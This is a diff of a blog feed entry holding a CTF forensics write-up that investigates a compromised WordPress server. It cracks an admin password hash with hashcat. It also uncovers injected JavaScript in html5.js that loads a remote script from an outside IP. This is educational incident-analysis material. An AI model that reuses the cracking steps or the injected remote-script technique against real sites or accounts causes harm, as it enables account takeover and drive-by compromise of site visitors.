@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>High Bytes by bt3gl</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/bt3gl.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-09-26T04:21:00-04:00</updated><entry><title>Forensics-300: Fluffy No More</title><link href="http://bt3gl.github.io/forensics-300-fluffy-no-more.html" rel="alternate"></link><updated>2014-09-26T04:21:00-04:00</updated><author><name>bt3gl</name></author><id>tag:bt3gl.github.io,2014-09-26:forensics-300-fluffy-no-more.html</id><summary type="html">&lt;p&gt;This is the fourth and the last forensics challenge in the CSAW CTF 2014 competition. I think it was much harder than any of the three before it, but it's also much more interesting. &lt;/p&gt;
-&lt;p&gt;The challenge stars with the following text:&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>High Bytes by bt3gl</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/bt3gl.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-09-26T04:21:00-04:00</updated><entry><title>Forensics-300: Fluffy No More</title><link href="http://bt3gl.github.io/forensics-300-fluffy-no-more.html" rel="alternate"></link><updated>2014-09-26T04:21:00-04:00</updated><author><name>bt3gl</name></author><id>tag:bt3gl.github.io,2014-09-26:forensics-300-fluffy-no-more.html</id><summary type="html">&lt;p&gt;This is the fourth and the last forensics challenge in the CSAW CTF 2014 competition. I think it was much harder than any of the three before it, but it was also much more interesting.&lt;/p&gt;
+&lt;p&gt;The challenge starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner. 
+&lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner.
 Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??&lt;/p&gt;
 &lt;p&gt;Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!&lt;/p&gt;
 &lt;p&gt;Written by brad_anton&lt;/p&gt;
@@ -11,7 +11,7 @@ Life was grand for the fluff fanatic until one day the site's users started to g
 &lt;p&gt;Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!&lt;/p&gt;
 &lt;h2&gt;Inspecting the Directories&lt;/h2&gt;
 &lt;p&gt;We start by checking the identity of the file with the command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;. We do this to make sure that the extension is not misleading:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file CSAW2014-FluffyNoMore-v0.1.tar.bz2 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;file CSAW2014-FluffyNoMore-v0.1.tar.bz2
 CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block &lt;span class="nv"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 900k
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -19,11 +19,11 @@ CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block &lt;span class=
 &lt;p&gt;OK, cool, we can go ahead and unzip the &lt;em&gt;bzip2&lt;/em&gt; (compressed) tarball:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tar --help | grep bz
   -j, --bzip2                filter the archive through bzip2
-&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2 
+&lt;span class="nv"&gt;$ &lt;/span&gt;tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now, let's take a look inside the folder:&lt;/p&gt;
+&lt;p&gt;Now let's take a look inside the folder:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tree CSAW2014-FluffyNoMore-v0.1
 CSAW2014-FluffyNoMore-v0.1
 ├── etc_directory.tar.bz2
@@ -35,7 +35,7 @@ CSAW2014-FluffyNoMore-v0.1
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;All right, 4 more tarballs. Unzip and organizing them, gives us the following directories:&lt;/p&gt;
+&lt;p&gt;All right, 4 more tarballs. Unziping and organizing them give us the following directories:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;
 &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;log&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;
 &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;mysql_backup&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sql&lt;/span&gt; &lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;MySQL&lt;/span&gt; &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="n"&gt;dump&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
@@ -44,22 +44,22 @@ CSAW2014-FluffyNoMore-v0.1
 
 &lt;p&gt;This is the directory structure of a  &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;, where LAMP stands for Linux-Apache-MySQL-PHP in the &lt;a href="http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html"&gt;Linux File System&lt;/a&gt;. In this framework, the PHP/HTML/JavaScript webpage is placed inside &lt;code&gt;var/www&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;The directory &lt;code&gt;var/&lt;/code&gt; contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at &lt;code&gt;/var/log&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;Finally, the &lt;code&gt;etc/&lt;/code&gt; directory contains the system configuration files. For example, the file &lt;code&gt;resolv.conf&lt;/code&gt; tells the system where to go on the network to obtain host name to IP address mappings (DNS), or the file  &lt;code&gt;passwd&lt;/code&gt; stores login information.&lt;/p&gt;
+&lt;p&gt;Finally, the &lt;code&gt;etc/&lt;/code&gt; directory contains the system configuration files. For example, the file &lt;code&gt;resolv.conf&lt;/code&gt; tells the system where to go on the network to obtain host name to IP address mappings (DNS). Another example, the file  &lt;code&gt;passwd&lt;/code&gt;, which stores login information.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Life is Made of Futile Tries&lt;/h2&gt;
-&lt;p&gt;OK,  before anything, we need to give a chance:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;key{&amp;quot;&lt;/span&gt; 
+&lt;p&gt;OK,  before anything, we need to give a try:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;key{&amp;quot;&lt;/span&gt;
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 
-&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt; 
+&lt;span class="nv"&gt;$ &lt;/span&gt;grep -r -l &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
 var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt; -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px 
+&lt;div class="highlight"&gt;&lt;pre&gt; -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -135,26 +135,32 @@ secretspace.com.    285 IN  A   72.167.232.29
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the sourcecode. Wrong direction...&lt;/p&gt;
-&lt;p&gt;All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use &lt;a href="http://www.phpmyadmin.net/home_page/index.php"&gt;phpMyAdmin&lt;/a&gt;, which I showed how to install and configure in my tutorial about setting up a &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the source code. Wrong direction...&lt;/p&gt;
+&lt;p&gt;All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use &lt;a href="http://www.phpmyadmin.net/home_page/index.php"&gt;phpMyAdmin&lt;/a&gt;, which I showed how to install and configure in my tutorial about setting up a &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;We open &lt;code&gt;localhost/phpmyadmin&lt;/code&gt; in our browser. First we go  to &lt;em&gt;Databases&lt;/em&gt; and then &lt;em&gt;Create Database&lt;/em&gt; with any name we want. Then we  &lt;em&gt;Import&lt;/em&gt; &lt;code&gt;`mysql_backup.sql&lt;/code&gt; to this database. All the tables are loaded. Let's use the &lt;em&gt;Search&lt;/em&gt; option to look for &lt;em&gt;key&lt;/em&gt; or &lt;em&gt;flag&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/tVOY1VJ.png" /&gt;
 &lt;img alt="" src="http://i.imgur.com/jY7CbLZ.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Nope. Nothing in special. By the way, &lt;code&gt;`default_pingback_flag1&lt;/code&gt; is just a &lt;strong&gt;Wordpress&lt;/strong&gt; flag indicating the default status of ping backs when new blog posts are published. &lt;/p&gt;
-&lt;p&gt;Continuing our searc, if we look inside inside each of the tables we find:
-   -  The URL for the &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com"&gt;blog&lt;/a&gt;, which doesn't render. However, in the source code, there is a commented link that leads to a &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&amp;amp;prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&amp;amp;poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&amp;amp;cifr=1&amp;amp;%22"&gt;cute website&lt;/a&gt;. Nothing else.
-   - A hashed password!
+&lt;p&gt;Nope. Nothing in special. By the way, &lt;code&gt;`default_pingback_flag1&lt;/code&gt; is just a &lt;strong&gt;Wordpress&lt;/strong&gt; flag indicating the default status of ping backs when new blog posts are published.&lt;/p&gt;
+&lt;p&gt;Continuing our search, if we look  inside each of the tables we find:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;The URL for the &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com"&gt;blog&lt;/a&gt;, which doesn't render. However, in the source code, there is a commented link that leads to a &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&amp;amp;prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&amp;amp;poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&amp;amp;cifr=1&amp;amp;%22"&gt;cute website&lt;/a&gt;. Nothing else.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;A hashed password!
 &lt;img alt="" src="http://i.imgur.com/FiQONze.png" /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Cracking the Password&lt;/h2&gt;
-&lt;p&gt;We want to unhash &lt;code&gt;$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1&lt;/code&gt; and for this we are going to use &lt;a href="http://hashcat.net/hashcat/"&gt;hashcat&lt;/a&gt;. If you are in &lt;a href="http://www.kali.org/"&gt;Kali&lt;/a&gt; or in any Debian distribution you can install it with:&lt;/p&gt;
+&lt;p&gt;We want to crack &lt;code&gt;$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1&lt;/code&gt; and for this we are going to use &lt;a href="http://hashcat.net/hashcat/"&gt;hashcat&lt;/a&gt;. If you are in &lt;a href="http://www.kali.org/"&gt;Kali&lt;/a&gt; or in any Debian distribution you can install it with:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;apt-get hashact
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;In Fedora, we need to download and unzip it:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget http://hashcat.net/files/hashcat-0.47.7z
-&lt;span class="nv"&gt;$ &lt;/span&gt;7za e hashcat-0.47.7z 
+&lt;span class="nv"&gt;$ &lt;/span&gt;7za e hashcat-0.47.7z
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -165,7 +171,7 @@ secretspace.com.    285 IN  A   72.167.232.29
 
 &lt;p&gt;If this is not the case, this is an example for you (it's allways good to have several lists!):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;wget http://www.scovetta.com/download/500_passwords.txt
-&lt;span class="nv"&gt;$ &lt;/span&gt;head 500_passwords.txt 
+&lt;span class="nv"&gt;$ &lt;/span&gt;head 500_passwords.txt
 123456
 password
 12345678
@@ -203,7 +209,7 @@ mustang
 
 
 &lt;p&gt;We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file &lt;em&gt;pass.hash&lt;/em&gt;. Then, we run:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;./hashcat-cli64.bin -m 400 -a 0 -o cracked.txt --remove  pass.hash word_list.txt
 
 Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
 
@@ -231,23 +237,39 @@ Stopped: Thu Sep 25 18:25:50 2014
 &lt;p&gt;where:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;-m is for --hash-type=NUM&lt;/li&gt;
-&lt;li&gt;-a 0: Using a dictionary attack &lt;/li&gt;
+&lt;li&gt;-a 0: Using a dictionary attack&lt;/li&gt;
 &lt;li&gt;cracked.txt is the output file&lt;/li&gt;
 &lt;li&gt;word_list.txt is our dictionary&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Now let's take a peak in the output file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat cracked.txt 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;cat cracked.txt
 &lt;span class="nv"&gt;$P$BmHbpWPZrjt&lt;/span&gt;.2V8T2xDJfbDrAJZ9So1:fluffybunnies
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;It worked! Our password is &lt;strong&gt;fluffybunnies&lt;/strong&gt;!&lt;/p&gt;
-&lt;p&gt;All right, this is a very silly password! It could be easy guessed. If you were the attacker, wouldn't you try this as the first option ? OK, maybe right after &lt;em&gt;password&lt;/em&gt; and &lt;em&gt;123456&lt;/em&gt;...&lt;/p&gt;
+&lt;p&gt;All right, this is a very silly password! It could be easily guessed. If you were the attacker, wouldn't you try this as the first option? OK, maybe right after &lt;em&gt;password&lt;/em&gt; and &lt;em&gt;123456&lt;/em&gt;... :)&lt;/p&gt;
 &lt;h4&gt;What we have so far&lt;/h4&gt;
-&lt;p&gt;In conclusion, all we have learned from this file was  the attacker's motivation, the blog's URL, that the application was in Wordpress, and a password. Ah,  also that &lt;code&gt;mailserver_login:login@example.com&lt;/code&gt; and &lt;code&gt;mailserver_pass=password&lt;/code&gt;. Talking about security... Let's move on.&lt;/p&gt;
+&lt;p&gt;All we have learned from this file was:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;the attacker's motivation,&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;the blog's URL,&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;that the application was in Wordpress,&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;and a password.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Ah,  also that &lt;code&gt;mailserver_login:login@example.com&lt;/code&gt; and &lt;code&gt;mailserver_pass=password&lt;/code&gt;. Talking about security...&lt;/p&gt;
+&lt;p&gt;Let's move on.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Inspecting /var/logs/apache2&lt;/h2&gt;
-&lt;p&gt;The next item in the list is log inspection:&lt;/p&gt;
+&lt;p&gt;The next item in the list is log inspection. We need to choose it wisely, there are many of them:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;find . -type f  -name &lt;span class="s1"&gt;&amp;#39;*.log&amp;#39;&lt;/span&gt;
 ./apache2/error.log
 ./apache2/access.log
@@ -284,23 +306,31 @@ Stopped: Thu Sep 25 18:25:50 2014
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;If there is any important information in the log files, it should appears in the end of it, because the attack should be one of the last things that were logged. &lt;a href="http://en.wikipedia.org/wiki/Tail_(Unix)"&gt;Tailing&lt;/a&gt; the &lt;em&gt;apache&lt;/em&gt; logs did not reveal anything useful. Maybe it is interesting to know that we see the IP &lt;em&gt;192.168.127.137&lt;/em&gt; in the file &lt;em&gt;/apache2/access.log&lt;/em&gt;, which belongs to &lt;em&gt;MASTER OF DISASTER&lt;/em&gt; (see above). So &lt;em&gt;hacker&lt;/em&gt; was not the attacker?&lt;/p&gt;
+&lt;p&gt;If there is any important information in the log files, it should appears in the end, because the attack should be one of the last things that were logged.&lt;/p&gt;
+&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Tail_(Unix)"&gt;Tailing&lt;/a&gt; the &lt;em&gt;apache&lt;/em&gt; logs did not reveal anything useful. Maybe it is interesting to know that we see the IP &lt;em&gt;192.168.127.137&lt;/em&gt; in the file &lt;em&gt;/apache2/access.log&lt;/em&gt;, which belongs to &lt;em&gt;MASTER OF DISASTER&lt;/em&gt; (see above). So &lt;em&gt;hacker&lt;/em&gt; was not the attacker?&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Inspecting var/logs/auth.log&lt;/h2&gt;
-&lt;p&gt;Now, considering that the password &lt;strong&gt;fluffybunnies&lt;/strong&gt; was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted. Tailing &lt;code&gt;auth.log&lt;/code&gt; shows something interesting:&lt;/p&gt;
+&lt;p&gt;Now, considering that the password &lt;strong&gt;fluffybunnies&lt;/strong&gt; was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted.&lt;/p&gt;
+&lt;p&gt;Tailing &lt;code&gt;auth.log&lt;/code&gt; shows something interesting:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;Sep 17 19:18:53 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/chmod -R 775 /var/www/
 Sep 17 19:20:09 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
 Sep 17 19:20:55 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 ; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www ; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root ; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/find /var/www/html/ * touch &lt;span class="o"&gt;{}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;So someone logged as root and:
- 1. downgraded the permissions of &lt;em&gt;/var/www&lt;/em&gt; (755 means read and execute access for everyone and also write access for the owner of the file), and
- 2. modified a JavaScript file (html5.js) in &lt;em&gt;vi&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;So someone logged as root:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;downgraded the permissions of &lt;em&gt;/var/www&lt;/em&gt; (755 means read and execute access for everyone and also write access for the owner of the file), and&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;modified a JavaScript file (html5.js) in &lt;em&gt;vi&lt;/em&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
 &lt;hr /&gt;
 &lt;h2&gt;Finding the JavaScript Exploit&lt;/h2&gt;
 &lt;p&gt;It looks like an attack to me! Let's &lt;a href="http://linux.die.net/man/1/diff"&gt;diff&lt;/a&gt; this JavaScript file with the original (&lt;a href="http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html"&gt;which we can just google&lt;/a&gt;):&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;diff html5.js html5_normal.js 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;diff html5.js html5_normal.js
 93,122d92
 &amp;lt; var &lt;span class="nv"&gt;g&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ti&amp;quot;&lt;/span&gt;;
 &amp;lt; var &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;HTML Tags&amp;quot;&lt;/span&gt;;
@@ -336,8 +366,10 @@ Sep 17 19:20:55 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&
 
 
 &lt;p&gt;Aha!!! So what is being written?&lt;/p&gt;
-&lt;p&gt;In JavaScript, the function &lt;code&gt;document.write()&lt;/code&gt; writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to &lt;code&gt;console.log()&lt;/code&gt; (and changing any &lt;code&gt;document&lt;/code&gt; word to &lt;code&gt;console&lt;/code&gt;). To run JavaScript in the console, you need to install &lt;a href="http://nodejs.org/"&gt;Node&lt;/a&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;node html5.js 
+&lt;p&gt;In JavaScript, the function &lt;code&gt;document.write()&lt;/code&gt; writes HTML expressions or JavaScript code to a document. However, we can debug it in the console if we want, changing it to &lt;code&gt;console.log()&lt;/code&gt; (and changing any &lt;code&gt;document&lt;/code&gt; word to &lt;code&gt;console&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;To run JavaScript in the console, you need to install &lt;a href="http://nodejs.org/"&gt;Node&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;So we run and we get a URL:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;node html5.js
 &amp;lt;script &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://128.238.66.100/analytics.js&amp;#39;&lt;/span&gt;&amp;gt;&amp;lt;/script&amp;gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -352,28 +384,29 @@ HTTP request sent, awaiting response... 200 OK
 Length: 16072 &lt;span class="o"&gt;(&lt;/span&gt;16K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/javascript&lt;span class="o"&gt;]&lt;/span&gt;
 Saving to: ‘analytics.js’
 
-100%&lt;span class="o"&gt;[===============================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; 16,072      --.-K/s   in 0.008s  
+100%&lt;span class="o"&gt;[===============================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; 16,072      --.-K/s   in 0.008s
 
 2014-09-25 19:17:19 &lt;span class="o"&gt;(&lt;/span&gt;2.02 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘analytics.js’ saved &lt;span class="o"&gt;[&lt;/span&gt;16072/16072&lt;span class="o"&gt;]&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;The file turns out to be large, and &lt;em&gt;grep&lt;/em&gt; &lt;em&gt;flag&lt;/em&gt; or &lt;em&gt;key&lt;/em&gt; doesn't give any result back. No IP addresses or URL neither. &lt;/p&gt;
-&lt;p&gt;OK, let's take a closer look at it. We open the file in a text editor and we found a weird hex-encoded variable that is completely unconnected from the rest:&lt;/p&gt;
+&lt;p&gt;The file turns out to be large, and &lt;em&gt;grep&lt;/em&gt; &lt;em&gt;flag&lt;/em&gt; or &lt;em&gt;key&lt;/em&gt; doesn't show any hit. No IP addresses or URL neither.&lt;/p&gt;
+&lt;p&gt;OK, let's take a closer look. We open the file in a text editor and we find a weird hex-encoded variable that is completely unconnected from the rest:&lt;/p&gt;
